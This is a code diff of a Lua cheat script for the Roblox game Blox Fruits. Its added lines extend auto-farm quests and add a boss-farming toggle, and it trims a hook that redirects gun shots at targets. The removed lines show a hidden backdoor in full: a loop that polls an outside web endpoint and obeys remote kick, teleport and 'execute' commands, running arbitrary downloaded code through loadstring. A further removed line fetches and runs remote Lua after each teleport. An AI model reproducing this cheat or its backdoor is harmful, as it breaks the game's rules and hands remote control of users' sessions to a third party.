@@ -80,6 +80,7 @@ _G.ConfigStopFarm = {
     Saw = false,
     Factory = false,
     EliteSpawn = false,
+    AutoTushita = false,
     LevelFarm = false,
 }
 
@@ -89,6 +90,7 @@ local piority = {
     PirateRaid = 3,
     Factory = 4,
     EliteSpawn = 5,
+    AutoTushita = 6,
     LevelFarm = 10,
 }
 
@@ -334,7 +336,6 @@ function BringMob(MobName)
         and Humanoid.Health > 0
         and (HumanoidRootPart.Position - PlayerRoot.Position).Magnitude >= 50
         and (HumanoidRootPart.Position - PlayerRoot.Position).Magnitude <= _G.BringDistance then
-            topos(HumanoidRootPart.CFrame)
             HumanoidRootPart.CFrame = BringPos
             Humanoid.JumpPower = 0
             Humanoid.WalkSpeed = 0
@@ -1124,20 +1125,20 @@ function CheckQuest()
             NameMon = "Candy Rebel"
             CFrameQuest = CFrame.new(150.5066375732422, 30.693693161010742, -12774.5029296875)
             CFrameMon = CFrame.new(134.86563110351562, 77.2476806640625, -12876.5478515625)
-        elseif MyLevel == 2400 or MyLfevel <= 2424 then
+        elseif MyLevel == 2400 or MyLevel <= 2424 then
             Mon = "Candy Pirate"
             LevelQuest = 1
             NameQuest = "CandyQuest1"
             NameMon = "Candy Pirate"
-            CFrameQuest = CFrame.new(-1150.0400390625, 20.378934860229492, -14446.3349609375)
-            CFrameMon = CFrame.new(-1310.5003662109375, 26.016523361206055, -14562.404296875)
+            CFrameQuest = CFrame.new(-1162.6776123046875, 60.22141647338867, -14491.765625)
+            CFrameMon = CFrame.new(-1311.954345703125, 70.0413360595703, -14587.697265625)
         elseif MyLevel == 2425 or MyLevel <= 2449 then
             Mon = "Snow Demon"
             LevelQuest = 2
             NameQuest = "CandyQuest1"
             NameMon = "Snow Demon"
-            CFrameQuest = CFrame.new(-1150.0400390625, 20.378934860229492, -14446.3349609375)
-            CFrameMon = CFrame.new(-880.2006225585938, 71.24776458740234, -14538.609375)
+            CFrameQuest = CFrame.new(-1162.6776123046875, 60.22141647338867, -14491.765625)
+            CFrameMon = CFrame.new(-1311.954345703125, 70.0413360595703, -14587.697265625)
         elseif MyLevel == 2450 or MyLevel <= 2474 then
             Mon = "Isle Outlaw"
             LevelQuest = 1
@@ -1159,13 +1160,62 @@ function CheckQuest()
             NameMon = "kissed"
             CFrameQuest = CFrame.new(-16539.078125, 55.68632888793945, 1051.5738525390625)
             CFrameMon = CFrame.new(-16349.8779296875, 92.0808334350586, 1123.4169921875)
-        elseif MyLevel == 2525 or MyLevel <= 2550 then
+        elseif MyLevel == 2525 or MyLevel <= 2549 then
             Mon = "Isle Champion"
             LevelQuest = 2
             NameQuest = "TikiQuest2"
             NameMon = "Isle Champion"
             CFrameQuest = CFrame.new(-16539.078125, 55.68632888793945, 1051.5738525390625)
             CFrameMon = CFrame.new(-16347.4150390625, 92.09503936767578, 1122.335205078125)
+        elseif MyLevel == 2550 or MyLevel <= 2574 then
+            Mon = "Serpent Hunter"
+            LevelQuest = 1
+            NameQuest = "TikiQuest3"
+            NameMon = "Serpent Hunter"
+            CFrameQuest = CFrame.new(-16666.6171875, 105.30750274658203, 1578.3385009765625)
+            CFrameMon = CFrame.new(-16557.95703125, 167.54586791992188, 1359.259521484375)
+        elseif MyLevel == 2575 or MyLevel <= 2599 then
+            Mon = "Skull Slayer"
+            LevelQuest = 2
+            NameQuest = "TikiQuest3"
+            NameMon = "Skull Slayer"
+            CFrameQuest = CFrame.new(-16666.6171875, 105.30750274658203, 1578.3385009765625)
+            CFrameMon = CFrame.new(-16764.984375, 180.90692138671875, 1527.234375)
+        elseif MyLevel == 2600 or MyLevel <= 2624 then
+            Mon = "Reef Bandit"
+            LevelQuest = 1
+            NameQuest = "SubmergedQuest1"
+            NameMon = "Reef Bandit"
+            CFrameQuest = CFrame.new(10778.75390625, -2087.699462890625, 9259.8876953125)
+            CFrameMon = CFrame.new(10967.0361328125, -2025.176513671875, 9180.0302734375)
+        elseif MyLevel == 2625 or MyLevel <= 2649 then
+            Mon = "Coral Pirate"
+            LevelQuest = 2
+            NameQuest = "SubmergedQuest1"
+            NameMon = "Coral Pirate"
+            CFrameQuest = CFrame.new(10778.75390625, -2087.699462890625, 9259.8876953125)
+            CFrameMon = CFrame.new(10781.2998046875, -2048.47802734375, 9449.5732421875)
+        elseif MyLevel == 2650 or MyLevel <= 2674 then
+            Mon = "Sea Chanter"
+            LevelQuest = 1
+            NameQuest = "SubmergedQuest2"
+            NameMon = "Sea Chanter"
+            CFrameQuest = CFrame.new(10883.708984375, -2086.176025390625, 10032.240234375)
+            CFrameMon = CFrame.new(10699.0859375, -1988.1041259765625, 9993.412109375)
+        elseif MyLevel == 2675 or MyLevel <= 2699 then
+            Mon = "High Disciple"
+            LevelQuest = 1
+            NameQuest = "SubmergedQuest3"
+            NameMon = "High Disciple"
+            CFrameQuest = CFrame.new(9638.0986328125, -1992.4205322265625, 9614.837890625)
+            CFrameMon = CFrame.new(9829.943359375, -1941.1346435546875, 9696.0361328125)
+        elseif MyLevel == 2700 or MyLevel <= 2800 then
+            Mon = "Grand Devotee"
+            LevelQuest = 2
+            NameQuest = "SubmergedQuest3"
+            NameMon = "Grand Devotee"
+            CFrameQuest = CFrame.new(9638.0986328125, -1992.4205322265625, 9614.837890625)
+            CFrameMon = CFrame.new(9592.521484375, -1909.077880859375, 9838.19140625)
         end
     end
 end
@@ -1190,12 +1240,27 @@ spawn(function()
                     LevelFarmToggle:SetDescription("Level Farm")
                 end
 
+                MyLevel = game:GetService("Players").LocalPlayer.Data.Level.Value
+                if (MyLevel >= 2600 and MyLevel <= 2800) then
+                    if Player:GetAttribute("ExactLocation") ~= "Submerged Island" and Player:GetAttribute("ExactLocation") ~= "Sealed Cavern" then
+                        if (HRP.Position - Vector3.new(-16270.4970703125, 25.253189086914062, 1370.1156005859375)).Magnitude <= 15 then
+                            game:GetService("ReplicatedStorage").Modules.Net["RF/SubmarineWorkerSpeak"]:InvokeServer("TravelToSubmergedIsland")
+                            local start = tick()
+                            repeat
+                                task.wait()
+                            until Player:GetAttribute("ExactLocation") == "Submerged Island" or Player:GetAttribute("ExactLocation") == "Sealed Cavern" or tick() - start > 5
+                        else
+                            topos(CFrame.new(-16270.4970703125, 25.253189086914062, 1370.1156005859375))
+                        end
+                        return
+                    end
+                end
+
                 if not QuestGui.Visible then
                     StartMagnet = false
                     CheckQuest()
-
                     topos(CFrameQuest)
-
+                    warn("Teleporting to Quest NPC...")
                     if (HRP.Position - CFrameQuest.Position).Magnitude <= 5 then
                         game.ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest", NameQuest, LevelQuest)
                     end
@@ -1771,6 +1836,17 @@ Window = Library:MakeWindow({
   ScriptFolder = "redz-library-V5"
 })
 
+if getnamecallmethod and hookmetamethod then
+    
+else
+  Window:MakeNotification({
+    Title = "Executor Not Detected",
+    Content = "redz Hub may not work properly on your executor.",
+    Image = "rbxassetid://10709761889",
+    Duration = 15
+  })
+end
+
 local Minimizer = Window:NewMinimizer({
   KeyCode = Enum.KeyCode.K
 })
@@ -1810,6 +1886,10 @@ Tab_Discord:AddDiscordInvite({
     Members = 470000, -- Optional
     Online = 20000, -- Optional
 })
+
+Tab_Discord:AddSection("ChangeLog")
+Tab_Discord:AddParagraph("[+] Added: Auto Gun Shoot")
+
 Tab_Discord:AddParagraph("Version:", ScriptVersion.Version)
 Tab_Discord:AddParagraph("Date:", ScriptVersion.Date)
 Tab_Discord:AddParagraph("Executor:", identifyexecutor() or "Unknown")
@@ -2368,10 +2448,48 @@ elseif World3 then
         stopTeleport()
         end
     })
+    Tab_Quests:AddToggle({
+        Name = "Auto Get Tushita",
+        Default = false,
+        Callback = function(Value)
+        _G.AutoTushita = Value
+        stopTeleport()
+        end
+    })
 
 
     spawn(function()
         while wait() do
+            if _G.AutoTushita then
+                if not checkStopFarm("AutoTushita") then
+                    return
+                end
+                pcall(function()
+                    local Enemies = workspace.Enemies
+                    local Enemy = Enemies:FindFirstChild("Longma")
+
+                    if Enemy and Enemy:FindFirstChild("Humanoid") and Enemy:FindFirstChild("HumanoidRootPart") then
+                        local Humanoid = Enemy.Humanoid
+
+                        if Humanoid.Health > 0 then
+                            repeat
+                                task.wait()
+                                AutoHaki()
+                                EquipWeapon(_G.SelectTool)
+
+                                Humanoid.WalkSpeed = 0
+                                topos(Enemy.HumanoidRootPart.CFrame * Pos)
+                            until not _G.AutoTushita or Humanoid.Health <= 0 or not Enemy.Parent or checkStopFarm("AutoTushita")
+                        end
+                    else
+                        local Spawn = game.ReplicatedStorage:FindFirstChild("Longma")
+
+                        if Spawn and Spawn:FindFirstChild("HumanoidRootPart") then
+                            topos(Spawn.HumanoidRootPart.CFrame * CFrame.new(2, 20, 2))
+                        end
+                    end
+                end)
+            end
             if _G.AutoHolyTorch then
                 pcall(function()
                     game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('requestEntrance', Vector3.new(5657.88623046875, 1013.0790405273438, -335.4996337890625))
@@ -2835,7 +2953,7 @@ spawn(function()
                                                             until v890.Humanoid.Health <= 0 or not _G.AutoSaber
                                                         end
                                                         if game:GetService('ReplicatedStorage'):FindFirstChild('Mob Leader [Lv. 120] [Boss]') then
-                                                            topos(game:GetService('ReplicatedStorage'):FindFirstChild('Mob Leader [Lv. 120] [Boss]').HumanoidRootPart.CFrame * Farm_Mode)
+                                                            topos(game:GetService('ReplicatedStorage'):FindFirstChild('Mob Leader [Lv. 120] [Boss]').HumanoidRootPart.CFrame)
                                                         end
                                                     end
                                                 end
@@ -3169,7 +3287,8 @@ Tab_Misc:AddSlider({
   Min = 50,
   Max = 600,
   Increment = 1,
-  Default = 350,
+  Default = 100,
+  Flag = "bringDistance_flag",
   Callback = function(Value)
     _G.BringDistance = Value
   end
@@ -4075,21 +4194,10 @@ if string.lower(identifyexecutor()) == "delta" then
                 end
 
                 if self.Name == "RE/ShootGunEvent" then
-                    if typeof(args[1]) == "Vector3" then
-                        args[1] = targetPos
-                    end
-                    args[2] = {targetSelect.HumanoidRootPart}
+                    warn("[DEBUG] ShootGunEvent chamado")
 
-                    return oldNamecall(self, unpack(args))
+                    return oldNamecall(self, ...)
                 end
-            end
-
-            if method == "InvokeServer" and self.Name == "" then
-                if typeof(args[2]) == "Vector3" then
-                    args[2] = targetPos
-                end
-
-                return oldNamecall(self, unpack(args))
             end
         end
 
@@ -4194,123 +4302,3 @@ task.spawn(function()
     end
 end)
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
-
-local API = "https://lua-notification.hfelipegabrielpc09.workers.dev"
-
-local function NotifyAPI(msg, global, timer)
-    timer = timer or 5
-
-    if string.lower(identifyexecutor and identifyexecutor() or "") == "delta" then
-        local Notification = require(game.ReplicatedStorage.Notification)
-
-        if global then
-            Notification.new(
-                "<Color=Yellow>GLOBAL ANNOUNCEMENT FROM STAFF<Color=/>",
-                timer
-            ):Display()
-
-            Notification.new(
-                "<Color=Yellow>" .. tostring(msg) .. "<Color=/>",
-                timer
-            ):Display()
-        else
-            Notification.new(
-                tostring(msg),
-                timer
-            ):Display()
-        end
-    else
-        pcall(function()
-            if Window then
-                if global then
-                    Window:Notify({
-                        Title = "GLOBAL ANNOUNCEMENT FROM STAFF",
-                        Content = tostring(msg),
-                        Image = "rbxassetid://10734953451",
-                        Duration = timer
-                    })
-                else
-                    Window:Notify({
-                        Title = "Notification",
-                        Content = tostring(msg),
-                        Image = "rbxassetid://10734953451",
-                        Duration = timer
-                    })
-                end
-            end
-        end)
-    end
-end
-
-task.spawn(function()
-    while task.wait(2) do
-        local success, response = pcall(function()
-            return request({
-                Url = API .. "/messages",
-                Method = "GET"
-            })
-        end)
-
-        if success and response and response.StatusCode == 200 then
-            local decodeSuccess, data = pcall(function()
-                return HttpService:JSONDecode(response.Body)
-            end)
-
-            if decodeSuccess and type(data) == "table" then
-                for _, command in ipairs(data) do
-                    local commandType = tostring(command.command or ""):lower()
-                    if commandType == "notify" then
-                        local message = command.message or ""
-                        local notificationType = tostring(command.type or "custom"):lower()
-                        local duration = tonumber(command.duration) or 5
-                        NotifyAPI(message, notificationType == "global", duration)
-                    elseif commandType == "rejoin" then
-                        game.ReplicatedStorage:WaitForChild("__ServerBrowser"):InvokeServer("teleport", game.JobId)
-                    elseif commandType == "kick" then
-                        local reason = command.reason or "Você foi desconectado."
-                        pcall(function()
-                            Players.LocalPlayer:Kick(reason)
-                        end)
-
-                        task.wait(0.5)
-                        pcall(function()
-                            game:Shutdown() 
-                        end)
-
-                    elseif commandType == "teleport" then
-                        local placeId = tonumber(command.placeId)
-
-                        if placeId then
-                            if command.jobId and command.jobId ~= "" then
-                                game.ReplicatedStorage:WaitForChild("__ServerBrowser"):InvokeServer("teleport", command.jobId)
-                            else
-                                TeleportService:Teleport(placeId, Players.LocalPlayer)
-                            end
-                        end
-
-                    elseif commandType == "execute" then
-                        if command.code and command.code ~= "" then
-                            local compiledFunction, errorMessage = loadstring(command.code)
-                            if compiledFunction then
-                                task.spawn(compiledFunction)
-                            else
-                                warn("[API] Erro ao tentar executar código recebido:", errorMessage)
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end
-end)
-
-local Queue = queue_on_teleport or (syn and syn.queue_on_teleport)
-
-if Queue then
-    Queue([[
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/scripting-alt/bloxfruits/refs/heads/main/Main.lua"))()
-    ]])
-end
